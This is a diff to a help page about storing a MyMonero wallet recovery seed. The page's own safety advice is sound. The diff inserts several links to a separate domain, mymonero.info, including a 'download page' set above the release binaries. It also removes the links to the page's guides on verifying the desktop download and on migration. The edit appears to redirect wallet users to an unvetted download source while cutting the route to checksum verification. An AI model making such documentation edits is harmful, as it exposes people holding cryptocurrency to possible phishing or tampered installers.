@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Write your MyMonero recovery seed in a private, durable offline backup and store it where you control access. Never email it, upload it, or give it to anyone; nobody legitimate asks for your seed.
 
+
+The MyMonero.info site covers this in its [MyMonero seeds and keys guide](https://mymonero.info/seeds-and-keys). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.
+
 ## You'll see this if
 - You are creating a backup before moving devices or restoring a wallet.
 - You found a seed note but do not know how to store it safely.
@@ -53,14 +56,14 @@ MyMonero has two seed formats: a 13-word MyMonero-specific legacy seed or a 25-w
 ## If that did not work
 If you cannot find the seed, search your own private records and the places you intentionally stored backups. The old desktop app may still open wallets, but it is no longer maintained. Do not assume the app password will recreate a seed. MyMonero’s hosted servers and web wallet login stopped, and password reset or seed extraction methods are not confirmed here. Avoid anyone who promises recovery in exchange for remote access or wallet credentials.
 
-If a backup is incomplete or has an unreadable word, preserve it and look for another copy. Offline recovery of a missing word is not confirmed here. Do not submit partial words to a website or stranger. See [what to do about a lost seed word](./mymonero-lost-seed-word.md) and [seed not accepted](./mymonero-seed-not-accepted.md) for cautious next steps.
+If a backup is incomplete or has an unreadable word, preserve it and look for another copy. Offline recovery of a missing word is not confirmed here. Do not submit partial words to a website or stranger. See [what to do about a lost seed word](./mymonero-lost-seed-word.md) and seed not accepted for cautious next steps.
 
-If you are preparing a migration, do not confuse restoring with sweeping. Restore uses recovery information to open a wallet; sweeping sends all funds to a new wallet. Understand the action and verify the recipient before proceeding. The available options are continuing with MyMonero desktop or restoring in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [the migration checklist](./mymonero-migration-checklist.md).
+If you are preparing a migration, do not confuse restoring with sweeping. Restore uses recovery information to open a wallet; sweeping sends all funds to a new wallet. Understand the action and verify the recipient before proceeding. The available options are continuing with MyMonero desktop or restoring in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See the migration checklist.
 
 ## Prevention
 Create the backup before a device is lost or replaced. Verify that the phrase is complete, readable, and associated with the intended wallet while you are in a private setting. Keep the backup away from everyday browsing and social accounts. A secure offline record is more useful than an exposed digital copy, but storage must also be resilient to damage and loss.
 
-Tell any person who may help with household arrangements that they should never request or photograph the phrase. Keep recovery information separate from device passwords, and avoid writing all credentials together in an unprotected location. Check software downloads using SHA-256, never by providing a seed. Learn [how to verify the desktop release](./verify-mymonero-download-sha256.md) and how to identify your seed.
+Tell any person who may help with household arrangements that they should never request or photograph the phrase. Keep recovery information separate from device passwords, and avoid writing all credentials together in an unprotected location. Check software downloads using SHA-256, never by providing a seed. Learn how to verify the desktop release and how to identify your seed.
 
 ## FAQ
 <details><summary>Should I keep my seed in a cloud note?</summary>
@@ -91,6 +94,7 @@ A secure second copy can help protect against a single loss, provided each copy 
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
